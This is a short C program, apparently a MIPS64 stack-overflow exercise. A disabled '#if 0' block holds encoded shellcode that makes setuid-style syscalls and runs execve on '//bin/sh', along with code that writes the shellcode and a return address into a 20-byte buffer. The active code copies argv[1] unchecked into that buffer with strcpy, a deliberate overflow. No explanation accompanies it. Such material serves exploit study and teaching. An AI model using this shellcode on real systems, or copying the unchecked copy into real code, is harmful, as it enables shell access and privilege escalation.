#include <stdio.h>
#include <string.h>

#if 0
char sc[] = { 
        "\x28\x04\xff\xff"        /* slti    $a0,$zero,-1  */
        "\x24\x02\x13\x33"        /* li      $v0,5102      */
        "\x01\x01\x01\x0c"        /* syscall 0x40404       */
        "\x24\x02\x13\xef"        /* li      $v0,5103      */
        "\x01\x01\x01\x0c"        /* syscall 0x40404       */
        "\x28\x06\xff\xff"        /* slti    $a2,$zero,-1   */
        "\x3c\x18\x2f\x2f"        /* lui     $t8,$0x2f2f    */
        "\x37\x18\x62\x69"        /* ori     $t8,$t8,$0x6269 */
        "\xaf\xb8\xff\xf4"        /* sw      $t8,-12($sp)   */
        "\x3c\x18\x6e\x2f"        /* lui     $t8,0x6e2f    */
        "\x37\x18\x73\x68"        /* ori     $t8,$t8,0x7368 */
        "\xaf\xb8\xff\xf8"        /* sw      $t8,-8($sp)    */
        "\xaf\xa0\xff\xfc"        /* sw      $zero,-4($sp)  */
        "\x67\xa4\xff\xf4"        /* addiu   $a0,$sp,-12    */
        "\x28\x05\xff\xff"        /* slti    $a1,$zero,-1   */
        "\x24\x02\x13\xc1"        /* li      $v0,5057      */
        "\x01\x01\x01\x0c"        /* syscall 0x40404        */
        "\x20\x20\x20\x20"
        "\x00"
};
unsigned long addr = 0;
#endif
int main (int argc, char **argv)
{
    char buf[20] = {0};
#if 0
    addr = (unsigned long)buf;

    strcpy (buf, sc);

    memcpy (buf+strlen(sc),&addr,8);
#else
    strcpy (buf, argv[1]);
#endif

    printf ("%s\n", buf);

    return 0;
}
